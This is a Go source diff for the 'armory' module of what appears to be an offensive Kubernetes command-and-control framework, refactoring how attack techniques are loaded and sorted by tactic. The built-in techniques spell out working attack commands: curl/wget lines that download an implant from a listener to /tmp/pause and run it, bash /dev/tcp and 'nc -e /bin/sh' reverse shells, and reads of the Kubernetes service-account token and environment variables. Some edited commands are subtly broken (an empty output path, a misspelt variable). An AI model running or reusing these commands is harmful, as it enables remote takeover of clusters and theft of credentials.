@@ -1,6 +1,7 @@
 package armory
 
 import (
+	"cmp"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -8,6 +9,7 @@ import (
 	"log/slog"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 
 	k8s_types "github.com/Magier/Ran/k8sclient/types"
@@ -16,116 +18,117 @@ import (
 	"gopkg.in/yaml.v2"
 )
 
-// type ResultHandler = func(source domain.Entity, args ...any) (domain.Event, error)
-
-// type TTPMeta struct {
-// 	Title, Description string
-// 	ResultHandler      ResultHandler
-// }
-
-// func (meta TTPMeta) GetTitle() string {
-// 	return meta.Title
-// }
-// func (meta TTPMeta) GetDescription() string {
-// 	return meta.Description
-// }
-
-// func (meta TTPMeta) HandleResult(source domain.Entity, args ...any) (domain.Event, error) {
-// 	if meta.ResultHandler == nil {
-// 		return nil, nil
-// 	}
-// 	return meta.ResultHandler(source, args...)
-// }
-
-// type CreateListener struct {
-// 	TTPMeta
-// 	Port uint
-// }
-
-// func (c CreateListener) GetMessage() domain.Message {
-// 	return domain.StartListener{Port: c.Port}
-// }
-
-// type CreateRedirector struct {
-// 	TTPMeta
-// 	DstPort uint
-// }
-
-// func (c CreateRedirector) GetMessage() domain.Message {
-// 	return
-// }
-
-// type ReadEnvVars struct {
-// 	TTPMeta
-// 	TargetId        string
-// 	Target          string
-// 	TargetNamespace string
-// }
-
-// func (c ReadEnvVars) GetMessage() domain.Message {
-// 	return domain.ReadEnvVars{
-// 		Target: &domain.Target{
-// 			Id:   c.TargetId,
-// 			Name: c.Target,
-// 			Ns:   c.TargetNamespace,
-// 		},
-// 	}
-// }
-
-// func (c KubectlExecCmd) GetMessage() domain.Message {
-// 	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
-// }
-
 type Armory struct {
 	ttps []domain.TTP
 }
 
 func LoadArmory(dir string) (Armory, error) {
-	ttps := []domain.TTP{
-		{
-			Name:        "Create Listener",
-			Description: "Catch incoming shells",
-			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
-			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
-			// Port:        1337,
-			CmdVariants: []domain.CmdVariant{},
-			// Effects: c2.ListenerReady{},
-		},
+	ttps := []domain.TTP{}
+
+	// parse "attacks as code" in the specified dir folder
+	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
+		if d.IsDir() {
+			// skip subfolder with all unsupported check details
+			// if d.Name() == SkipDir { }
+			// skip subfolder with all unsupported check details
+			// if d.Name() == SkipDir { }
+			return err
+		}
+
+		if strings.HasSuffix(w, ".yaml") {
+			content, err := os.ReadFile(w)
+			if err != nil {
+				return fmt.Errorf("failed to read file %s: %w", w, err)
+			}
+
+			var ttp domain.TTP
+			err = yaml.Unmarshal(content, &ttp)
+			if err != nil {
+				return fmt.Errorf("failed to unmarshal YAML content from file %s: %w", w, err)
+			}
+
+			ttps = append(ttps, ttp)
+			// parse the TTP
+			// parse the preconditions and effect
+
+			// parse the TTP
+			// parse the preconditions and effect
+
+		}
+
+		if strings.HasSuffix(w, ".md") {
+			// parse the TTP
+			// parse the preconditions and effect
+			// invoke builder to get the currect sub-type of the TTP (based on the kind?)
+
+			// parse the preconditions and effect
+			// invoke builder to get the currect sub-type of the TTP (based on the kind?)
+
+		}
+
+		return nil
+	})
+	if err != nil {
+		return Armory{}, errors.New("Couldn't load armory: " + err.Error())
+	}
+
+	ttps = append(ttps, []domain.TTP{
+		// {
+		// 	Name:        "Create Listener",
+		// 	Description: "Catch incoming shells",
+		// 	Tactic:     domain.ResourceDevelopment,
+		// 	Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
+		// 	// Port:        1337,
+		// 	CmdVariants: []domain.CmdVariant{},
+		// 	// Effects:     []domain.Event{c2.ListenerReady{}},
+		// },
+		// {
+		// 	Name:        "Create Listener",
+		// 	Description: "Catch incoming shells",
+		// 	Tactic:     domain.ResourceDevelopment,
+		// 	Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
+		// 	// Port:        1337,
+		// 	CmdVariants: []domain.CmdVariant{},
+		// 	// Effects:     []domain.Event{c2.ListenerReady{}},
+		// },
 		{
 			Name:        "Create Redirector",
 			Description: "Create a proxy routing traffic to the C2",
-			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
+			Tactic:      domain.ResourceDevelopment,
 			Command:     domain.StartC2Redirector{DstPort: 1337},
 			Requires:    domain.Requirements{Exists: "listener"},
 		},
 		{
 			Name:        "Drop & Exec Implant",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
-			Tactics:     []domain.Tactic{domain.Execution},
-			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
-			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
+			Tactic:      domain.Execution,
+			Args: map[string]string{
+				"SRC_BIN": "implant",
+				"DST_BIN": "/tmp/pause",
+			},
 			CmdVariants: []domain.CmdVariant{
-				{Key: "curl", Command: `sh -c "curl -L ${LISTENER}:${FILESHARE_PORT}/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
-				{Key: "wget", Command: `sh -c "wget ${LISTENER}:${FILESHARE_PORT}/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
+				{Key: "curl", Command: `sh -c "curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o  && chmod +x ${DST_BIN} && ${DST_BIN} &"`},
+				{Key: "wget", Command: `sh -c "wget ${LISTENER}:${FILESHARE_PORT}/${SRC_IN} -O ${DST_BIN} && chmod +x ${DST_BIN} && ${DST_BIN} &"`},
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
 		{
 			Name:        "Read SerivceAccount Token",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
-			Tactics:     []domain.Tactic{domain.CredentialAccess},
+			Tactic:      domain.CredentialAccess,
 			CmdVariants: []domain.CmdVariant{
 				{Key: "", Command: "cat"},
 				{Key: "sliver", Command: "get_file"},
 			},
-			Args:          map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
-			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
-			Effects:       []string{"Pod name", "ServiceAccount name", "Namespace name"},
+			Args:     map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
+			Requires: domain.Requirements{AccessLevel: domain.UserRead},
+			// Effects:  []domain.Event{domain.ServiceAccountTokenExtracted{}},
+			Effects:       []string{"src.Pod.name", "ServiceAccount.name", "Namespace.name"},
 			ResultHandler: handleSaTokenRead,
 		},
 		{
 			Name:     "Install kubectl",
-			Tactics:  []domain.Tactic{domain.Discovery},
+			Tactic:   domain.Discovery,
 			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
 			Args:     map[string]string{"PATH": "~/.local/bin/kubectl"},
 			CmdVariants: []domain.CmdVariant{
@@ -135,7 +138,7 @@ func LoadArmory(dir string) (Armory, error) {
 
 		{
 			Name:     "Check Token permissions",
-			Tactics:  []domain.Tactic{domain.Discovery},
+			Tactic:   domain.Discovery,
 			Requires: domain.Requirements{Kind: "ServiceAccount"},
 			CmdVariants: []domain.CmdVariant{
 				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
@@ -158,9 +161,9 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Start reverse shell",
 			Description: "Establish a simple shell",
-			Tactics:     []domain.Tactic{domain.Execution},
+			Tactic:      domain.Execution,
 			CmdVariants: []domain.CmdVariant{
-				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/$LISTENER/${LISTENER_PORT} 0>&1 &"`},
+				{Key: "shell", Command: `bash -c "bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &"`},
 				{Key: "nc", Command: `bash -c "nc "${LISTENER} ${LISTENER_PORT} -e /bin/sh &"`},
 			},
 			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
@@ -168,7 +171,7 @@ func LoadArmory(dir string) (Armory, error) {
 		{
 			Name:        "Read Environment Variables",
 			Description: "Read environment variables from a target",
-			Tactics:     []domain.Tactic{domain.Discovery},
+			Tactic:      domain.Discovery,
 			Requires:    domain.Requirements{AccessLevel: domain.UserRead},
 			CmdVariants: []domain.CmdVariant{
 				{Key: "shell", Command: `env`},
@@ -176,49 +179,43 @@ func LoadArmory(dir string) (Armory, error) {
 			},
 			ResultHandler: handleEnvVarResult,
 		},
-	}
-
-	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
-		if d.IsDir() {
-			// skip subfolder with all unsupported check details
-			// if d.Name() == SkipDir { }
-			return err
-		}
-
-		if strings.HasSuffix(w, ".yaml") {
-			content, err := os.ReadFile(w)
-			if err != nil {
-				return fmt.Errorf("failed to read file %s: %w", w, err)
-			}
-
-			var ttp domain.TTP
-			err = yaml.Unmarshal(content, &ttp)
-			if err != nil {
-				return fmt.Errorf("failed to unmarshal YAML content from file %s: %w", w, err)
-			}
-
-			ttps = append(ttps, ttp)
-			// parse the TTP
-			// parse the preconditions and effect
-
-		}
-
-		if strings.HasSuffix(w, ".md") {
-			// parse the TTP
-			// parse the preconditions and effect
-			// invoke builder to get the currect sub-type of the TTP (based on the kind?)
-
-		}
-
-		return nil
-	})
-	if err != nil {
-		fmt.Println("Couldn't load armory: ", err.Error())
-	}
+	}...)
 
 	return Armory{
-		ttps: ttps,
+		ttps: sortTTPs(ttps),
 	}, nil
+}
+
+// order all the TTPs first by the Tactic and then by their names
+func sortTTPs(ttps []domain.TTP) []domain.TTP {
+	tacticOrder := []domain.Tactic{
+		domain.Reconnaissance,
+		domain.ResourceDevelopment,
+		domain.InitialAccess,
+		domain.Execution,
+		domain.Persistence,
+		domain.PrivilegeEscalation,
+		domain.DefenseEvasion,
+		domain.CredentialAccess,
+		domain.Discovery,
+		domain.LateralMovement,
+		domain.Collection,
+		domain.CommandAndControl,
+		domain.Exfiltration,
+		domain.Impact,
+	}
+
+	tacticIndex := make(map[domain.Tactic]int)
+	for i, tactic := range tacticOrder {
+		tacticIndex[tactic] = i
+	}
+	slices.SortFunc(ttps, func(a, b domain.TTP) int {
+		return cmp.Or(
+			cmp.Compare(tacticIndex[a.Tactic], tacticIndex[b.Tactic]),
+			cmp.Compare(a.Name, b.Name),
+		)
+	})
+	return ttps
 }
 
 func (a Armory) GetTTP(id string) (domain.TTP, bool) {
